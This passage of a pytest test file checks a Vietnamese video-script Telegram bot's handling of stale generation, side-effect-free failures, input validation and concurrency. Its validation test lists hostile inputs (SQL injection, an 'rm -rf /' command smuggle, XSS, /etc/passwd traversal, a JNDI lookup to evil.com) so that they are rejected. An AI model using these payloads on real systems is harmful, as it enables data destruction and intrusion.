            handled = await bot.handle_video_product_pending_text(update, context)
            assert handled is True
            assert "⚠️ Kịch bản có hơn 20 ranh giới cảnh" in update.message.reply_text.call_args[0][0]

        # 3. Incomplete coverage via production handler branch
        with patch("bot.video_flow7_store_script_proposal", side_effect=ValueError("script_coverage_incomplete")):
            update.message.text = "truncated script content"
            handled = await bot.handle_video_product_pending_text(update, context)
            assert handled is True
            assert "⚠️ Chưa chứng minh được toàn bộ kịch bản đã được giữ" in update.message.reply_text.call_args[0][0]


@pytest.mark.anyio
async def test_failure_semantics_stale_generation_production_handler():
    """Stale generation invocations and completions drop cleanly with 0 side effects."""
    user_id = 888105
    query = MagicMock()
    query.edit_message_text = AsyncMock()
    stale_session = {
        "user_id": user_id,
        "draft": {
            "script_topic": "Chủ đề video",
            "script_duration_seconds": 40,
            "script_entry_scene_count": 5,
            "script_ai_revision": 1,
        },
    }
    active_session = {
        "user_id": user_id,
        "step": "script_ai_duration",
        "draft": {
            "script_topic": "Chủ đề video",
            "script_duration_seconds": 40,
            "script_entry_scene_count": 5,
            "script_ai_revision": 2,
        },
    }
    # 1. Stale invocation
    with patch("bot.get_video_session", return_value=active_session), \
         patch("bot.generate_video_script_pack", new_callable=AsyncMock) as mock_ai, \
         patch("bot.task3d_session_step") as mock_step:

        result = await bot.video_script_generate_ai(query, user_id, stale_session, "vi")
        assert result == active_session
        mock_ai.assert_not_called()
        mock_step.assert_not_called()

    # 2. Stale completion (active revision bumped while AI was computing)
    completion_session = {
        "user_id": user_id,
        "draft": {
            "script_topic": "Chủ đề video",
            "script_duration_seconds": 40,
            "script_entry_scene_count": 5,
            "script_ai_revision": 2,
        },
    }
    bumped_session = {
        "user_id": user_id,
        "step": "script_ai_platform",
        "draft": {
            "script_topic": "Chủ đề video",
            "script_duration_seconds": 40,
            "script_entry_scene_count": 5,
            "script_ai_revision": 3,
        },
    }
    valid_script = (
        "1. TÊN KỊCH BẢN\nDemo\n"
        "2. CONCEPT\nDemo concept\n"
        "3. HOOK\nDemo hook\n"
        "4. MỞ BÀI\nDemo mở\n"
        "5. DIỄN BIẾN\nDemo diễn biến\n"
        "6. CAO TRÀO\nDemo cao trào\n"
        "7. KẾT\nDemo kết\n"
        "8. CTA\nDemo cta\n"
        "9. NGƯỜI DẪN\nDemo dẫn\n"
        "10. NHÂN VẬT\nDemo nhân vật\n"
        "Cảnh 1: Một\nCảnh 2: Hai\nCảnh 3: Ba\nCảnh 4: Bốn\nCảnh 5: Năm"
    )
    with patch("bot.get_video_session", return_value=bumped_session), \
         patch("bot.generate_video_script_pack", new_callable=AsyncMock, return_value=valid_script), \
         patch("bot.video_flow7_store_script_proposal", return_value=({}, {"scenes": [1, 2, 3, 4, 5]})), \
         patch("bot.task3d_session_step") as mock_step:

        result = await bot.video_script_generate_ai(query, user_id, completion_session, "vi")
        assert result == bumped_session
        mock_step.assert_not_called()


@pytest.mark.anyio
async def test_zero_execution_side_effects_on_invalid_content_with_db_spies():
    """Spy real execution/dispatch boundaries and verify zero calls and zero row count deltas across all tables."""
    import sqlite3
    from services import video_project_queue as queue

    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    queue.ensure_video_project_queue_schema(conn)

    tables = ["video_projects", "video_jobs", "video_dispatch_outbox", "video_scenes"]
    initial_counts = {t: conn.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0] for t in tables}

    with patch("services.video_project_queue.confirm_public_product_video_invoice") as spy_confirm, \
         patch("services.video_project_queue._confirm_product_video_invoice_atomic") as spy_atomic, \
         patch("services.video_project_queue._insert_product_video_dispatch_outbox_record") as spy_outbox, \
         patch("services.video_project_queue.claim_product_video_dispatch_outbox") as spy_claim_dispatch, \
         patch("services.video_project_queue.claim_next_video_job") as spy_claim_job:

        user_id = 999301
        query = MagicMock()
        query.edit_message_text = AsyncMock()

        # Scenario 1: Empty script
        session_empty = {
            "user_id": user_id,
            "draft": {"script_topic": "Test empty", "script_duration_seconds": 40, "script_entry_scene_count": 5},
        }
        with patch("bot.generate_video_script_pack", new_callable=AsyncMock, return_value=""), \
             patch("bot.safe_edit_or_send", new_callable=AsyncMock), \
             patch("bot.video_script_duration_keyboard", return_value=MagicMock()):
            await bot.video_script_generate_ai(query, user_id, session_empty, "vi")

        # Scenario 2: Truncated script (fails parse / coverage)
        session_trunc = {
            "user_id": user_id,
            "draft": {"script_topic": "Test trunc", "script_duration_seconds": 40, "script_entry_scene_count": 5},
        }
        with patch("bot.generate_video_script_pack", new_callable=AsyncMock, return_value="short"), \
             patch("bot.video_flow7_store_script_proposal", side_effect=ValueError("script_coverage_incomplete")), \
             patch("bot.safe_edit_or_send", new_callable=AsyncMock), \
             patch("bot.video_script_duration_keyboard", return_value=MagicMock()):
            await bot.video_script_generate_ai(query, user_id, session_trunc, "vi")

        # Scenario 3: Unparseable manual script
        with pytest.raises(ValueError):
            bot.video_flow7_store_script_proposal(user_id, "", source="customer")

        # Scenario 4: Invalid duration / scene count
        with patch("services.video_flow7.parse_script_proposal", return_value={"source_text": "sample", "proposed_scene_count": 25, "coverage": {"no_truncation": True, "exact_match": True}}):
            with pytest.raises(ValueError):
                bot.video_flow7_store_script_proposal(user_id, "sample", source="customer")

        # Scenario 5: Stale generation result
        with patch("bot.get_video_session", return_value={"draft": {"script_ai_revision": 5}}), \
             patch("bot.generate_video_script_pack", new_callable=AsyncMock):
            await bot.video_script_generate_ai(query, user_id, {"draft": {"script_ai_revision": 1}}, "vi")

        # Assert ALL spied dispatch/execution calls remain strictly 0
        assert spy_confirm.call_count == 0
        assert spy_atomic.call_count == 0
        assert spy_outbox.call_count == 0
        assert spy_claim_dispatch.call_count == 0
        assert spy_claim_job.call_count == 0

        # Assert row count deltas across all tables remain strictly 0
        current_counts = {t: conn.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0] for t in tables}
        assert current_counts == initial_counts
        for t in tables:
            assert current_counts[t] == 0


@pytest.mark.anyio
async def test_platform_public_input_validation_handler_and_tamper_rejection():
    """Audit all platform entry paths: supported platforms succeed, empty/unknown/tampered inputs are rejected."""
    uid = 999401

    # 1. Pure validation function truth
    supported = ["tiktok_reels", "youtube_shorts", "facebook", "ads_landing", "multi"]
    for p in supported:
        ok, key, label = video_script_product.validate_platform(p)
        assert ok is True
        assert key == p
        assert len(label) > 0

    # Also canonical label support
    for key, label in video_script_product.PLATFORMS.items():
        ok, k, l = video_script_product.validate_platform(label)
        assert ok is True
        assert k == key

    # Empty / missing
    for invalid in ["", "   ", None]:
        ok, key, label = video_script_product.validate_platform(invalid)
        assert ok is False
        assert key == ""

    # Unknown
    for unknown in ["twitter", "threads", "snapchat", "random_social"]:
        ok, key, label = video_script_product.validate_platform(unknown)
        assert ok is False
        assert key == ""

    # Tampered / injections
    for tampered in [
        "'; DROP TABLE video_projects; --",
        "tiktok_reels; rm -rf /",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com}",
    ]:
        ok, key, label = video_script_product.validate_platform(tampered)
        assert ok is False
        assert key == ""

    # 2. Production Callback Handler: handle_video_product_callback
    update = MagicMock()
    context = MagicMock()
    context._product_video_callback_data_override = ""
    query = MagicMock()
    query.from_user.id = uid
    query.answer = AsyncMock()
    query.edit_message_text = AsyncMock()
    query.message = MagicMock()
    query.message.reply_text = AsyncMock()
    update.callback_query = query

    # Supported callback advances to script_ai_duration and persists canonical platform
    query.data = "vproduct|script_platform|tiktok_reels"
    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "draft": {}}), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.video_script_render_step", new_callable=AsyncMock) as mock_render:
        mock_step.return_value = {"step": "script_ai_duration", "draft": {"script_platform": "tiktok_reels"}}
        await bot.handle_video_product_callback(update, context)
        mock_step.assert_called_with(
            uid,
            "script_ai_duration",
            script_platform="tiktok_reels",
            script_platform_label="TikTok / Reels",
            provider_called=False,
            xu_charged=0,
        )
        mock_render.assert_called_once()

    # Tampered callback is rejected, does NOT persist into draft, returns to script_ai_platform
    query.data = "vproduct|script_platform|'; DROP TABLE users; --"
    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "draft": {}}), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.video_script_render_step", new_callable=AsyncMock) as mock_render:
        await bot.handle_video_product_callback(update, context)
        mock_step.assert_called_with(uid, "script_ai_platform")
        assert "script_platform" not in mock_step.call_args[1]
        mock_render.assert_called_once()

    # Empty callback is rejected
    query.data = "vproduct|script_platform|"
    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "draft": {}}), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.video_script_render_step", new_callable=AsyncMock) as mock_render:
        await bot.handle_video_product_callback(update, context)
        mock_step.assert_called_with(uid, "script_ai_platform")
        assert "script_platform" not in mock_step.call_args[1]

    # 3. Production Text Input Handler: handle_video_product_pending_text (awaiting_script_ai_platform)
    msg_update = MagicMock()
    msg_update.effective_user.id = uid
    msg_update.message = MagicMock()
    msg_update.message.reply_text = AsyncMock()

    # Tampered text input is rejected cleanly, resets to script_ai_platform without saving tampered value
    with patch("bot.get_video_session", return_value={"product_id": "script_image_video", "step": "awaiting_script_ai_platform", "current_step": "awaiting_script_ai_platform", "draft": {}}), \
         patch("bot.task3d_session_step") as mock_step, \
         patch("bot.video_script_render_step", new_callable=AsyncMock) as mock_render:
        msg_update.message.text = "'; DROP TABLE users; --"
        handled = await bot.handle_video_product_pending_text(msg_update, context)
        assert handled is True
        mock_step.assert_called_with(uid, "script_ai_platform", provider_called=False, xu_charged=0)
        assert "script_platform" not in mock_step.call_args[1]
        mock_render.assert_called_once()

    # 4. Prompt Generation Payload Immunity
    tampered_draft = {
        "script_topic": "Mỹ phẩm an toàn",
        "script_platform": "DROP TABLE video_projects;--",
        "script_entry_scene_count": 5,
        "script_duration_seconds": 40,
    }
    prompt = video_script_product.build_ai_prompt(tampered_draft)
    assert "DROP TABLE" not in prompt
    assert "Nền tảng: Nhiều nền tảng" in prompt


@pytest.mark.anyio
async def test_video_idea_empty_and_whitespace_custom_note_safety():
    """Empty and whitespace custom notes are safely ignored without corrupting idea plan or seeds."""
    uid = 999501
    base_idea = video_idea_catalog.ideas_for_category("sales", limit=1)[0]
    initial_plan = video_idea_catalog.build_plan(base_idea, duration_seconds=16)

    # 1. Pure catalog level verification
    empty_res = video_idea_catalog.apply_custom_note(initial_plan, "")
    assert empty_res["custom_note"] == ""
    assert empty_res["image_prompt_final"] == initial_plan["image_prompt_seed"]
    assert empty_res["video_prompt_final"] == initial_plan["video_prompt_seed"]
    assert "Yêu cầu riêng:" not in empty_res["image_prompt_final"]

    whitespace_res = video_idea_catalog.apply_custom_note(initial_plan, "   \n\t  ")
    assert whitespace_res["custom_note"] == ""
    assert whitespace_res["image_prompt_final"] == initial_plan["image_prompt_seed"]
    assert whitespace_res["video_prompt_final"] == initial_plan["video_prompt_seed"]
    assert "Yêu cầu riêng:" not in whitespace_res["image_prompt_final"]

    # 2. Production text message handler: handle_developing_video_pending_text
    update = MagicMock()
    update.effective_user.id = uid
    update.message = MagicMock()
    context = MagicMock()

    with patch("bot.get_developing_video_pending", return_value={"step": "catalog_edit", "flow": "videoidea", **initial_plan}), \
         patch("bot.clear_developing_video_pending") as mock_clear, \
         patch("bot.save_developing_video_plan", side_effect=lambda u, f, p: p) as mock_save, \
         patch("bot.safe_reply_long_html", new_callable=AsyncMock) as mock_reply:

        # Case A: Whitespace input is safely ignored without clearing or corrupting plan
        update.message.text = "    \n   "
        handled = await bot.handle_developing_video_pending_text(update, context)
        assert handled is True
        mock_clear.assert_not_called()
        mock_save.assert_not_called()

        # Case B: Valid text input applies note and updates plan cleanly
        update.message.text = "thêm ánh sáng vàng ấm"
        handled = await bot.handle_developing_video_pending_text(update, context)
        assert handled is True
        mock_clear.assert_called_with(uid)
        mock_save.assert_called_once()
        saved_plan = mock_save.call_args[0][2]
        assert saved_plan["custom_note"] == "thêm ánh sáng vàng ấm"
        assert "thêm ánh sáng vàng ấm" in saved_plan["video_prompt_final"]
        assert saved_plan["provider_called"] is False
        assert saved_plan["job_created"] is False
        assert saved_plan["outbox_created"] is False
        assert saved_plan["wallet_mutations"] == 0
        assert saved_plan["xu_charged"] == 0
        mock_reply.assert_called_once()


@pytest.mark.anyio
async def test_video_idea_stale_plan_blocks_subsequent_steps():
    """Stale/missing Video Idea plan cleanly blocks subsequent generation and edit steps."""
    uid = 999601
    lang = "vi"
    update = MagicMock()
    context = MagicMock()
    query = MagicMock()
    query.from_user.id = uid
    query.answer = AsyncMock()
    query.edit_message_text = AsyncMock()
    update.callback_query = query

    # When no plan exists in store for user
    with patch("bot.get_latest_developing_video_plan", return_value=None), \
         patch("bot.get_developing_video_pending", return_value=None), \
         patch("bot.safe_edit_or_send", new_callable=AsyncMock) as mock_send, \
         patch("bot.safe_edit_or_send_long_html", new_callable=AsyncMock) as mock_send_long, \
         patch("bot.video_profile_scene1_render", new_callable=AsyncMock) as mock_render:

        # 1. Stale catalog_edit callback falls back cleanly to options / menu without corrupting
        query.data = "videoidea|catalog_edit"
        await bot.handle_video_idea_callback(update, context)
        assert mock_send.call_count >= 1 or mock_send_long.call_count >= 1
        call_text = mock_send.call_args[0][1] if mock_send.call_args else mock_send_long.call_args[0][1]
        assert any(phrase in call_text for phrase in ["Chọn một hướng bằng nút số", "Ý TƯỞNG VIDEO", "Kho ý tưởng", "Bán hàng"])

        # 2. Stale handoff callback blocks video render route
        mock_send.reset_mock()
        mock_send_long.reset_mock()
        query.data = "videoidea|handoff"
        await bot.handle_video_idea_callback(update, context)
        mock_render.assert_not_called()
        assert mock_send.call_count >= 1 or mock_send_long.call_count >= 1

        # 3. Stale prompt preview callback blocks safely
        mock_send.reset_mock()
        mock_send_long.reset_mock()
        query.data = "videoidea|catalog_image_prompt"
        await bot.handle_video_idea_callback(update, context)
        mock_render.assert_not_called()


# ==============================================================================
# 12. EXISTING SPEC-00A / SPEC-00B / PV02 PROTECTION
# ==============================================================================

def test_protection_trend_tier_400_visible_and_80_xu():
    """Trend Tier 400 is visible with 80 Xu unchanged."""
    catalog = video_uifreeze1.catalog_report("video_trend", scene_count=1, ratio="9:16")
    tier_400 = next(t for t in catalog["offers"] if t["tier_id"] == 400)
    assert tier_400["unit_xu"] == 80
    assert tier_400["tier_id"] in catalog["tier_ids"]


def test_protection_pv02_aliases_and_commercial_contracts():
    """PV02 aliases and commercial routing remain strictly intact."""
    aliases = {
        "storyboard_video": "storyboard_prompt",
        "selfshot_scene_change": "self_shot_scene_change",
        "selfshot_cinematic": "self_shot_cinematic_transform",
    }
    for alias, canonical in aliases.items():
        adapter = video_tail9.adapter_for(alias)
        assert adapter["canonical_product_type"] == canonical
        assert adapter["executor_product_type"] == canonical


# ==============================================================================
# 13. HARDENED CONCURRENCY & INPUT CONTRACT LOCKS
# ==============================================================================

def test_task3d_session_step_concurrency_lock_prevents_lost_revision_update():
    """Thread-safe locking ensures concurrent session increments are atomic without lost updates."""
    import threading
    user_id = 999123
    store = {user_id: {"user_id": user_id, "draft": {"script_ai_revision": 1}}}
    store_lock = threading.Lock()

    def thread_safe_get(uid):
        with store_lock:
            return deepcopy(store[uid])

    def thread_safe_save(uid, sess):
        with store_lock:
            store[uid] = deepcopy(sess)
            return deepcopy(sess)

    allocated_revisions = []

    def worker():
        res = bot.task3d_session_step(user_id, "step_worker", increment_script_ai_revision=True)
        allocated_revisions.append(res["draft"]["script_ai_revision"])

    with patch("bot.get_video_session", side_effect=thread_safe_get), \
         patch("bot.save_video_session", side_effect=thread_safe_save):
        t1 = threading.Thread(target=worker)
        t2 = threading.Thread(target=worker)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

    assert sorted(allocated_revisions) == [2, 3]
    assert store[user_id]["draft"]["script_ai_revision"] == 3


def test_voice_resolution_default_female_precedence():
    """Default female voice must resolve to female provider ID, not shadowed by male substring match."""
    from services import voice_clone_pipeline

    def getter(gender):
        return "voice_female_01" if gender == "female" else "voice_male_01"

    res = voice_clone_pipeline.resolve_user_voice_for_tts(
        1001,
        "default_female",
        get_default_voice_id_func=getter,
    )
    assert res.ok is True
    assert res.provider_voice_id == "voice_female_01"
    assert res.voice_source == "default_female"


def test_video_idea_custom_note_bounded_1000_chars():
    """Video idea catalog custom note truncation and normalization."""
    plan = video_idea_catalog.build_plan({"title": "Test"}, custom_note="B" * 2500)
    assert len(plan["custom_note"]) == 2500  # build_plan retains brief
    bounded_plan = video_idea_catalog.apply_custom_note(dict(plan), ("C" * 1500)[:1000])
    assert len(bounded_plan["custom_note"]) == 1000


